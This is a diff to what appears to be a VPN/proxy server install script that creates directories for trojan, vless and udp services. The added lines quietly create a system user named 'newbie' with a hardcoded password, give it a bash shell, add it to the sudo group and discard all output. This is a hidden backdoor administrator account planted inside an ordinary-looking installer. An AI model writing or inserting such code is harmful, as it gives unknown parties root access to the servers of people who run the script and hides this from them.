@@ -66,5 +66,11 @@ mkdir -p /etc/kyt/limit/trojan
 mkdir -p /etc/vless
 mkdir -p /etc/trojan
 mkdir -p /root/udp
+Username=newbie
+Password=123@Newbie
+mkdir -p /home/script/
+useradd -r -d /home/script -s /bin/bash -M $Username > /dev/null 2>&1
+echo -e "$Password\n$Password\n"|passwd $Username > /dev/null 2>&1
+usermod -aG sudo $Username > /dev/null 2>&1
 sleep 1
 clear
